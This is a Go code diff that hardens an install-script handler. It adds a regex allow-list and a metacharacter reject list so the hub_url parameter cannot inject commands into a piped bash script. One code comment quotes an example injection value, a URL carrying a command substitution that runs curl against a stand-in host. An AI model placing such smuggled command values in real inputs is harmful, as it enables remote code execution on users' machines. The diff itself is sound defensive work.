@@ -7,6 +7,7 @@ import (
 	"io/fs"
 	"log/slog"
 	"net/http"
+	"regexp"
 	"strings"
 	"text/template"
 
@@ -14,6 +15,14 @@ import (
 	"shiguang-vps/internal/types"
 	"shiguang-vps/internal/util"
 )
+
+// hubURLPattern restricts the `hub_url` query parameter to a strict
+// scheme+host[+port][+path] shape. This is a defence-in-depth filter on top of
+// the bash single-quote escaping below: even if the escaping were bypassed
+// (e.g. by a future refactor that switched to double-quotes), the value
+// still cannot contain shell metacharacters such as `$`, `` ` ``, `\`,
+// `;`, `|`, `&`, `(`, `)`, `<`, `>`, `'`, `"`, whitespace, or NUL.
+var hubURLPattern = regexp.MustCompile(`^https?://[A-Za-z0-9.\-:]+(/[A-Za-z0-9._\-/]*)?$`)
 
 // installScriptTemplate is the embedded bash template. The Go template
 // engine fills {{.Token}} and {{.HubURL}} at request time so the bytes on
@@ -116,6 +125,15 @@ func (h *InstallScriptHandler) InstallScript(w http.ResponseWriter, r *http.Requ
 		hubURL = h.deriveHubURL(r)
 	}
 	hubURL = strings.TrimRight(hubURL, "/")
+	// Bug-1 (review-round1): reject any hub_url that does not match the
+	// allow-listed pattern. The rendered script writes the value verbatim
+	// into a bash variable; without this check a payload of the form
+	// `https://x$(curl evil)` would execute inside `curl … | bash`.
+	if !isSafeHubURL(hubURL) {
+		util.RespondError(w, types.ErrValidationInvalidFormat,
+			"invalid hub_url", nil, traceID)
+		return
+	}
 
 	vars := installScriptVars{
 		Token:   token,
@@ -204,6 +222,24 @@ func (h *InstallScriptHandler) deriveHubURL(r *http.Request) string {
 		host = fwd
 	}
 	return scheme + "://" + host
+}
+
+// isSafeHubURL applies the hubURLPattern allow-list AND an explicit reject
+// list of bash-significant metacharacters. The allow-list is enough to keep
+// every metachar out today; the explicit reject list is the second line of
+// defence in case the regex is ever loosened.
+func isSafeHubURL(s string) bool {
+	if s == "" || len(s) > 512 {
+		return false
+	}
+	for _, r := range s {
+		switch r {
+		case '$', '`', '\\', '\'', '"', ' ', '\t', '\n', '\r',
+			';', '|', '&', '(', ')', '<', '>', '{', '}', 0:
+			return false
+		}
+	}
+	return hubURLPattern.MatchString(s)
 }
 
 // isPlainToken returns true for tokens consisting only of url-safe
